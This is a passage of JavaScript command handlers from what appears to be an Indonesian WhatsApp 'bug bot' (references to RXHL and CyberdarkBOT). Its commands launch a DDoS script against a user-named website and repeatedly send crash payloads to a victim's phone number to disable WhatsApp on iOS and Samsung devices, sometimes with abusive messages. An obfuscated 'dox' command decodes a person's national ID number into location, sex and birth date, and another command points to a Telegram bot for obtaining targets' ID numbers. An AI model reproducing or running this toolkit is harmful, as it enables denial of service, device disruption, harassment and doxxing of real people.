if (!isMurbug) return replyz(global.nocreator)
if (!q.includes(' ')) return replyz(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
let moci = `*Bot is Attacking Wait for Results* 😤
• _Target_ ->  ${targetweb} 
• _Time Attack_ -> ${timeweb} `
rxhl.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Cek Websait",
      url: `${targetweb}`,
      merchant_url: `${targetweb}`
   })
}], m, {
   body: moci,
   footer: ''
})
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replyz(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replyz(`Error: ${stderr}`);
          return;
        }
        replyz(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         
break

case 'iosfull':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'iosfullv2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'samsungcrash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'slayer07':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {image: slayer07, caption: `SLAYER 07`},{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'darkness':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {document: slayer07, caption: `Darkness 㐅` },{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'virkon':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {image: slayer07, caption: `Virkon WhatsApp ✅`},{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'dox': { //by moraxs inc
const _0x1ad75f = _0x1d50;
(function (_0x5722d4, _0x5d79c5) {
    const _0x419fb2 = _0x1d50, _0x4594e3 = _0x5722d4();
    while (!![]) {
        try {
            const _0x5287ce = parseInt(_0x419fb2(0x1ba)) / (0x182b + 0x2331 + -0x3b5b * 0x1) + parseInt(_0x419fb2(0x1bb)) / (-0xcbf * -0x1 + -0x1d20 + -0x5 * -0x347) * (parseInt(_0x419fb2(0x1a4)) / (0x14d8 + 0x1 * 0xae5 + -0x83 * 0x3e)) + -parseInt(_0x419fb2(0x1bf)) / (-0xd * 0x10d + 0x304 * -0x1 + 0x10b1) + parseInt(_0x419fb2(0x1ae)) / (-0x145 * -0x1 + -0x1 * 0x226 + 0xe6) * (-parseInt(_0x419fb2(0x1b3)) / (-0x1 * 0x1091 + 0x888 + 0x80f * 0x1)) + parseInt(_0x419fb2(0x1a8)) / (0xc92 + -0x607 * -0x5 + -0x2aae) * (-parseInt(_0x419fb2(0x199)) / (0x2 * -0x12b9 + -0x1190 * 0x1 + 0x370a)) + parseInt(_0x419fb2(0x1bc)) / (-0x25dc + -0xb92 * 0x3 + 0x489b) + parseInt(_0x419fb2(0x1a3)) / (-0x66 * 0x1c + -0xf5b + 0x1a8d);
            if (_0x5287ce === _0x5d79c5)
                break;
            else
                _0x4594e3['push'](_0x4594e3['shift']());
        } catch (_0x4e059b) {
            _0x4594e3['push'](_0x4594e3['shift']());
        }
    }
}(_0x5367, -0x5ff + -0x12 * 0x88f9 + 0x13 * 0xe253));
if (!isMurbug)
    return;
if (!q)
    return replyz(_0x1ad75f(0x1c9) + '\x20' + (prefix + command) + (_0x1ad75f(0x198) + _0x1ad75f(0x1a5)));
function _0x1d50(_0x3c301c, _0x131a9c) {
    const _0x5e5a9a = _0x5367();
    return _0x1d50 = function (_0x1e5abf, _0xd89f17) {
        _0x1e5abf = _0x1e5abf - (-0x951 * -0x1 + -0x53 * 0x2 + -0xc * 0x97);
        let _0x1a89ba = _0x5e5a9a[_0x1e5abf];
        return _0x1a89ba;
    }, _0x1d50(_0x3c301c, _0x131a9c);
}
nik = q[_0x1ad75f(0x1aa)]();
const moraxs = require(_0x1ad75f(0x1c0) + _0x1ad75f(0x1c7) + _0x1ad75f(0x1a1)), white = new Date()[_0x1ad75f(0x1b4) + 'r']()[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1b2)](-(-0x1ca1 * 0x1 + 0x983 + 0x1320)), green = nik[_0x1ad75f(0x1c2)](0x1 * -0x1a0e + 0x1399 + -0x67f * -0x1, -0x665 + 0x90e + 0x3 * -0xdf), yellow = nik[_0x1ad75f(0x1c2)](-0xbf1 + 0x1af * -0x12 + 0xe17 * 0x3, 0xd * -0x10a + -0x1466 + 0x21f0);
function _0x5367() {
    const _0x495ec9 = [
        '\x0aLahir:\x20',
        '\x0aKecamatan',
        '251772mkKAbJ',
        './lib/getd',
        'D:\x20',
        'substring',
        '\x0aProvince:',
        'length',
        '0|10|9|11|',
        '\x0aNama\x20Kabu',
        'ata/wilaya',
        'igit',
        '*Example*:',
        'split',
        '\x203216728xx',
        '1040LAXXul',
        '\x0aKelamin:\x20',
        'Perempuan',
        'kabkot',
        '4|2|5',
        'harus\x2016\x20d',
        '8|7|6|1|3|',
        '\x0aKode\x20Pos:',
        'h.json',
        '\x0aProvice\x20I',
        '12351070HwEtZc',
        '33NRugLl',
        'xxxxx',
        'Laki-laki',
        '\x0aKabupaten',
        '50309UGiCCa',
        '[\x20ELLEN\x20OFC',
        'toString',
        'Nomor\x20NIK\x20',
        'matan:\x20',
        'slice',
        '137235iFAOFQ',
        '\x20--\x20',
        '\x20ID:\x20',
        'provinsi',
        'substr',
        '114OBnjVf',
        'getFullYea',
        '\x0aNama\x20Keca',
        '\x0aUniqcode:',
        'paten:\x20',
        'kecamatan',
        '\x20]\x0a\x0aNik:\x20',
        '708334MZIFmC',
        '1000yrrSlg',
        '341469uKBskL'
    ];
    _0x5367 = function () {
        return _0x495ec9;
    };
    return _0x5367();
}
if (nik[_0x1ad75f(0x1c4)] == -0x18cf + 0x3 * -0x943 + 0x34a8) {
    const xhYroT = (_0x1ad75f(0x1c5) + _0x1ad75f(0x19f) + _0x1ad75f(0x19d))[_0x1ad75f(0x197)]('|');
    let hoQumn = 0x2 * -0x2d1 + -0x1ca9 + 0x224b;
    while (!![]) {
        switch (xhYroT[hoQumn++]) {
        case '0':
            provinceid = nik[_0x1ad75f(0x1c2)](-0x186f + 0x26a * -0x1 + 0x1ad9, -0x11 * 0x151 + 0x3 * -0x7f5 + 0x2e42);
            continue;
        case '1':
            kelamin = yellow > -0xd40 + 0x1045 + 0x2dd * -0x1 ? _0x1ad75f(0x19b) : _0x1ad75f(0x1a6);
            continue;
        case '2':
            V = green < white ? '20' + green : '19' + green;
            continue;
        case '3':
            lahir = yellow > 0x1 * -0x1c68 + -0xa * -0x17 + 0x1baa ? (yellow - (-0x950 + 0x248 + 0x5c * 0x14))[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1c4)] > -0x5 * -0x301 + 0xe30 + 0xe * -0x216 ? (yellow - (-0x2137 + 0x173 * -0x13 + 0x3ce8))[_0x1ad75f(0x1aa)]() : '0' + (yellow - (-0x1d8 * -0x4 + -0xbf7 + 0x4bf))[_0x1ad75f(0x1aa)]() : yellow;
            continue;
        case '4':
            X = nik[_0x1ad75f(0x1c2)](0x19e5 + -0xdf7 + -0x5f3 * 0x2, -0xb * 0x28d + -0x1fe8 * 0x1 + -0x3c01 * -0x1);
            continue;
        case '5':
            Z = nik[_0x1ad75f(0x1c2)](-0xeb * -0x1b + 0xbad + -0x246a, 0x1202 + -0x2055 + 0xe63);
            continue;
        case '6':
            kodepos = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x1ad3 + -0x1468 + -0x66b, 0x524 + -0x1b7f + -0x151 * -0x11)][_0x1ad75f(0x1ad)](-(-0xb2 * -0xc + -0xd * -0x225 + 0x121a * -0x2));
            continue;
        case '7':
            kecamatan = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x163a + -0x242a + 0xdf0, 0x11 * -0x41 + -0xf7f * 0x1 + 0x13d6)][_0x1ad75f(0x197)](_0x1ad75f(0x1af))[0x1e9e + 0x399 + 0x13 * -0x1cd];
            continue;
        case '8':
            kecamatanId = nik[_0x1ad75f(0x1c2)](-0x2 * -0xe13 + 0x2431 + 0x931 * -0x7, 0x1e26 + 0x38e + 0x1 * -0x21ae);
            continue;
        case '9':
            kabupatenKotaId = nik[_0x1ad75f(0x1c2)](0x6 * -0x115 + 0xed * -0x4 + 0xa32, -0x192c + -0x1 * -0x189 + 0x17a7);
            continue;
        case '10':
            province = moraxs[_0x1ad75f(0x1b1)][nik[_0x1ad75f(0x1c2)](-0x649 * 0x1 + 0x5d9 * -0x1 + -0x1 * -0xc22, 0x1f04 + 0x92f * 0x3 + -0x3a8f * 0x1)];
            continue;
        case '11':
            kabupatenKota = moraxs[_0x1ad75f(0x19c)][nik[_0x1ad75f(0x1c2)](0x8c5 + -0x280 + -0x645, -0x1ea5 + -0x1 * 0xb0f + 0x14dc * 0x2)];
            continue;
        }
        break;
    }
} else
    return replyz(_0x1ad75f(0x1ab) + _0x1ad75f(0x19e) + _0x1ad75f(0x1c8));
await sleep(-0x240b * -0x1 + 0x1e3f + -0x3692), replyz(_0x1ad75f(0x1a9) + _0x1ad75f(0x1b9) + q + (_0x1ad75f(0x1a2) + _0x1ad75f(0x1c1)) + provinceid + (_0x1ad75f(0x1c3) + '\x20') + province + (_0x1ad75f(0x1a7) + _0x1ad75f(0x1b0)) + kabupatenKotaId + (_0x1ad75f(0x1c6) + _0x1ad75f(0x1b7)) + kabupatenKota + (_0x1ad75f(0x1be) + _0x1ad75f(0x1b0)) + kecamatanId + (_0x1ad75f(0x1b5) + _0x1ad75f(0x1ac)) + kecamatan + (_0x1ad75f(0x1a0) + '\x20') + kodepos + _0x1ad75f(0x19a) + kelamin + _0x1ad75f(0x1bd) + lahir + '/' + X + '/' + V + (_0x1ad75f(0x1b6) + '\x20') + Z);
}
break

case 'getnik':
if (!isMurbug) return replyz(global.nocreator)
tutor = fs.readFileSync('./lib/video/tutor.mp4')
rxhl.sendMessage(from, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break

case 'samsungfull':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'samsung-brutal':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
sleep(200)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'fatal-notif': case 'fatal-ui':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'bug-brutal':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendSystemCrashMessage(Pe)
bakdok(Pe, force)
ngeloc(Pe, force)
iponcrash(Pe)
sleep(200)
sendSystemCrashMessage(Pe)
pirgam(Pe, bugquoteddvc)
sendLiveLocationMessage(Pe)
sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'crash-all-dvc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendSystemCrashMessage(Pe)
iponcrash(Pe)
sleep(100)
ngeloc(Pe, force)
pirgam(Pe, bugquoteddvc)
sleep(100)
sendLiveLocationMessage(Pe)
bakdok(Pe, force)
sendSystemCrashMessage(Pe)
iponcrash(Pe)
sleep(100)
ngeloc(Pe, force)
pirgam(Pe, bugquoteddvc)
sleep(100)
sendLiveLocationMessage(Pe)
bakdok(Pe, force)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break


case 'all-dvc2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://chat.whatsapp.com/KhWRxn1USyD0SWdFUN0gL4`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://chat.whatsapp.com/KhWRxn1USyD0SWdFUN0gL4`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://chat.whatsapp.com/KhWRxn1USyD0SWdFUN0gL4`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'killwhatsapp':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY CyberdarkBOT`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'auto-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'new-bunga':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'kill-ripper':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'external-crash1': case 'external-crash2': case 'external-crash3': case 'internal-crash1': case 'internal-crash2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
}
